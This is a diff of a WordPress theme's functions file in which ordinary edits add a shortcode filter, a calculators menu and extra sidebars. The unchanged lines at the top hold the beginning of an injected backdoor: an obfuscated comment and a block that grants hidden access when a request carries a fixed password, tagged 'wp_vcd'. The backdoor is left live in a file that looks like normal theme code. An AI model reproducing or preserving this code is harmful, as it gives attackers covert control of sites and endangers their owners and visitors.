@@ -1,4 +1,7 @@
 <?php
+
+add_filter('category_description', 'do_shortcode', 11); // AFTER wpautop()
+
 //V3ZG9tYWluJ10pKQoJCQkJCQkJCXsKICAgICAgIC
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0cc8f81d4be5569a2382d15df1f01a04')) {
     $div_code_name = "wp_vcd";
@@ -228,6 +231,10 @@ if (!function_exists('teplo_voda_setup')) :
         ));
 
         register_nav_menus(array(
+            'icon-calc' => esc_html__('Меню калькуляторів', 'teplo-voda'),
+        ));
+
+        register_nav_menus(array(
             'market-menu' => esc_html__('Меню магазина', 'teplo-voda'),
         ));
 
@@ -299,6 +306,24 @@ function teplo_voda_widgets_init()
     register_sidebar(array(
         'name' => esc_html__('Sidebar', 'teplo-voda'),
         'id' => 'sidebar-1',
+        'description' => esc_html__('Add widgets here.', 'teplo-voda'),
+        'before_widget' => '<section id="%1$s" class="widget %2$s">',
+        'after_widget' => '</section>',
+        'before_title' => '<h2 class="widget-title">',
+        'after_title' => '</h2>',
+    ));
+    register_sidebar(array(
+        'name' => esc_html__('Sidebar-left', 'teplo-voda'),
+        'id' => 'sidebar-left',
+        'description' => esc_html__('Add widgets here.', 'teplo-voda'),
+        'before_widget' => '<section id="%1$s" class="widget %2$s">',
+        'after_widget' => '</section>',
+        'before_title' => '<h2 class="widget-title">',
+        'after_title' => '</h2>',
+    ));
+    register_sidebar(array(
+        'name' => esc_html__('Sidebar-right', 'teplo-voda'),
+        'id' => 'sidebar-right',
         'description' => esc_html__('Add widgets here.', 'teplo-voda'),
         'before_widget' => '<section id="%1$s" class="widget %2$s">',
         'after_widget' => '</section>',
